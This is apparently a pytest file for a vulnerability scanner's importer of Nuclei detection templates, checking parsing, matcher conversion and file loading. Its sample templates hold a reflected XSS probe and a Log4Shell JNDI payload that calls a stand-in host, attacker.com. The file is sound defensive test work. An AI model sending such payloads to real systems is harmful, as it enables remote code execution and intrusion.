"""Tests for Nuclei template compatibility importer."""

from __future__ import annotations

import pytest
from pathlib import Path

from vibee_hacker.core.nuclei_compat import NucleiImporter, NucleiTemplate
from vibee_hacker.core.template_engine import Template
from vibee_hacker.core.models import Severity


SAMPLE_NUCLEI_YAML = """
id: test-xss-reflected

info:
  name: Reflected XSS Test
  author: testauthor
  severity: high
  description: Detects reflected XSS vulnerability
  tags: xss,reflected,owasp
  reference:
    - https://owasp.org/www-community/attacks/xss/

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=<script>alert(1)</script>"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        condition: and
      - type: status
        status:
          - 200
"""

SAMPLE_NUCLEI_WITH_REGEX = """
id: log4shell-detect

info:
  name: Log4Shell Detection
  severity: critical
  description: Detects Log4Shell (CVE-2021-44228)
  tags: log4j,rce,critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      User-Agent: "${jndi:ldap://attacker.com/a}"
    matchers:
      - type: regex
        regex:
          - "(?i)log4j"
        condition: or
      - type: dsl
        dsl:
          - "contains(body, 'log4j')"
"""


# ---------------------------------------------------------------------------
# parse_nuclei tests
# ---------------------------------------------------------------------------

def test_parse_nuclei_basic():
    importer = NucleiImporter()
    tmpl = importer.parse_nuclei(SAMPLE_NUCLEI_YAML)
    assert tmpl is not None
    assert tmpl.id == "test-xss-reflected"
    assert tmpl.name == "Reflected XSS Test"
    assert tmpl.severity == "high"
    assert tmpl.description == "Detects reflected XSS vulnerability"
    assert tmpl.author == "testauthor"
    assert "xss" in tmpl.tags
    assert "reflected" in tmpl.tags
    assert len(tmpl.requests) == 1
    assert tmpl.requests[0]["method"] == "GET"


def test_parse_nuclei_invalid_yaml():
    importer = NucleiImporter()
    result = importer.parse_nuclei("this: is: not: valid: yaml: !!!")
    # yaml.safe_load may not raise on all forms — test both None and non-crash
    # The important thing is it doesn't raise an exception
    # For truly broken YAML:
    result2 = importer.parse_nuclei("{broken yaml [}")
    assert result2 is None


def test_parse_nuclei_empty():
    importer = NucleiImporter()
    assert importer.parse_nuclei("") is None
    assert importer.parse_nuclei("null") is None
    assert importer.parse_nuclei("42") is None


# ---------------------------------------------------------------------------
# convert_to_vibee tests
# ---------------------------------------------------------------------------

def test_convert_to_vibee():
    importer = NucleiImporter()
    nuclei = importer.parse_nuclei(SAMPLE_NUCLEI_YAML)
    assert nuclei is not None
    vibee = importer.convert_to_vibee(nuclei)
    assert isinstance(vibee, Template)
    assert vibee.id == "test-xss-reflected"
    assert vibee.name == "Reflected XSS Test"
    assert vibee.severity == Severity.HIGH
    assert vibee.description == "Detects reflected XSS vulnerability"
    assert "xss" in vibee.tags
    assert len(vibee.requests) == 1


def test_convert_word_matcher():
    importer = NucleiImporter()
    matcher = {
        "type": "word",
        "words": ["<script>alert(1)</script>"],
        "condition": "and",
    }
    result = importer._convert_matcher(matcher)
    assert result is not None
    assert result["type"] == "word"
    assert result["words"] == ["<script>alert(1)</script>"]
    assert result["condition"] == "and"


def test_convert_status_matcher():
    importer = NucleiImporter()
    matcher = {"type": "status", "status": [200, 302]}
    result = importer._convert_matcher(matcher)
    assert result is not None
    assert result["type"] == "status"
    assert result["status"] == [200, 302]


def test_convert_regex_matcher():
    importer = NucleiImporter()
    matcher = {
        "type": "regex",
        "regex": ["(?i)log4j"],
        "condition": "or",
    }
    result = importer._convert_matcher(matcher)
    assert result is not None
    assert result["type"] == "regex"
    assert result["regex"] == ["(?i)log4j"]


def test_convert_dsl_returns_none():
    importer = NucleiImporter()
    matcher = {"type": "dsl", "dsl": ["contains(body, 'test')"]}
    result = importer._convert_matcher(matcher)
    assert result is None


# ---------------------------------------------------------------------------
# import_file / import_directory tests
# ---------------------------------------------------------------------------

def test_import_file(tmp_path):
    yaml_file = tmp_path / "xss.yaml"
    yaml_file.write_text(SAMPLE_NUCLEI_YAML, encoding="utf-8")

    importer = NucleiImporter()
    template = importer.import_file(yaml_file)
    assert template is not None
    assert isinstance(template, Template)
    assert template.id == "test-xss-reflected"
    assert template.severity == Severity.HIGH


def test_import_file_nonexistent():
    importer = NucleiImporter()
    result = importer.import_file("/nonexistent/path/template.yaml")
    assert result is None


def test_import_directory(tmp_path):
    (tmp_path / "xss.yaml").write_text(SAMPLE_NUCLEI_YAML, encoding="utf-8")
    (tmp_path / "log4shell.yaml").write_text(SAMPLE_NUCLEI_WITH_REGEX, encoding="utf-8")

    importer = NucleiImporter()
    templates = importer.import_directory(tmp_path)
    assert len(templates) == 2
    ids = {t.id for t in templates}
    assert "test-xss-reflected" in ids
    assert "log4shell-detect" in ids


def test_import_directory_nonexistent():
    importer = NucleiImporter()
    result = importer.import_directory("/nonexistent/dir")
    assert result == []


# ---------------------------------------------------------------------------
# _parse_tags tests
# ---------------------------------------------------------------------------

def test_parse_tags_string_and_list():
    importer = NucleiImporter()
    # String form
    tags = importer._parse_tags("xss,reflected,owasp")
    assert tags == ["xss", "reflected", "owasp"]

    # List form
    tags2 = importer._parse_tags(["sqli", "injection"])
    assert tags2 == ["sqli", "injection"]

    # Empty string
    tags3 = importer._parse_tags("")
    assert tags3 == []

    # Unknown type
    tags4 = importer._parse_tags(None)
    assert tags4 == []
